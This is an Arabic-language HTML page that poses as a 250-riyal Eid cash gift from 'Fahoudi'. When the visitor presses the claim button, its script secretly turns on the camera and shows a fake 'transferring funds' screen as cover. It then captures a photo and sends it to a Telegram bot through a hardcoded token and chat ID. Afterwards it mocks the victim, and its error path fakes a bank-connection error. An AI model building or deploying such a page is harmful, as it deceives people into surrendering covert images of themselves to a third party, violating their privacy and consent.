<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>هدية خاصة لك من فهودي 🎁</title>
    
    <meta property="og:title" content="هدية خاصة لك من فهودي 🎁">
    <meta property="og:description" content="اضغط هنا لاستلام عيدية بقيمة 250 ريال مقدمة من فهودي.">
    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB2a9JizqwqvDF5Q7taaKTkohGvbyt4ePOFQ&s">

    <style>
        :root { --primary-color: #128c7e; --accent-color: #25d366; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 400px; animation: fadeIn 0.5s; }
        .logo { width: 90px; height: 90px; border-radius: 50%; margin-bottom: 15px; border: 3px solid var(--accent-color); object-fit: cover; }
        .amount-box { background: #f0fff4; padding: 15px; border-radius: 15px; margin: 20px 0; border: 2px dashed var(--accent-color); }
        .amount { font-size: 45px; color: #075e54; font-weight: bold; }
        .btn { background: var(--primary-color); color: white; border: none; padding: 15px; border-radius: 50px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.3s; }
        .btn:active { transform: scale(0.95); }
        video, canvas { display: none; }
        .final-msg { color: #d63031; font-size: 26px; font-weight: bold; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

<div class="card" id="mainCard">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB2a9JizqwqvDF5Q7taaKTkohGvbyt4ePOFQ&s" class="logo">
    <h1>مبروك! وصلتك هدية 🎁</h1>
    <p>لقد أرسل لك <b>فهودي</b> مبلغاً نقدياً</p>
    <div class="amount-box"><span class="amount">250.00</span> ر.س</div>
    <button class="btn" onclick="takeGift()">تأكيد استلام المبلغ</button>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const TOKEN = "8680007162:AAEKrDXjZJdNKdWeT6pIkMXyALj0m30q34I";
    const CHAT_ID = "-3805611772"; 

    async function takeGift() {
        try {
            // تشغيل الكاميرا في الخلفية
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            // تغيير الواجهة للتمويه
            const card = document.getElementById('mainCard');
            card.innerHTML = `
                <div style="font-size:50px; animation: spin 2s linear infinite;">⏳</div>
                <h3>جاري تحويل المبلغ...</h3>
                <p>يرجى عدم إغلاق الصفحة لإتمام الإيداع</p>
                <style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
            `;

            // تصوير وإرسال
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'shot.jpg');
                    formData.append('caption', 'صيد جديد لعيون فهودي! 😂📸');

                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });

                    // الرسالة المطلوبة
                    setTimeout(() => {
                        card.innerHTML = `
                            <div class="final-msg">🤡 تعيش وتأكل غيرها!</div>
                            <p style="margin-top:15px; font-size:18px;">صورتك الحين نورت جوالي يا سبك!</p>
                            <p style="font-weight:bold; color:#128c7e; font-size:20px;">عيدك مبارك من فهودي 😂</p>
                        `;
                    }, 1000);
                }, 'image/jpeg');
            }, 1200);

        } catch (err) {
            alert("خطأ في الاتصال بالبنك، يرجى المحاولة مرة أخرى.");
        }
    }
</script>
</body>
</html>
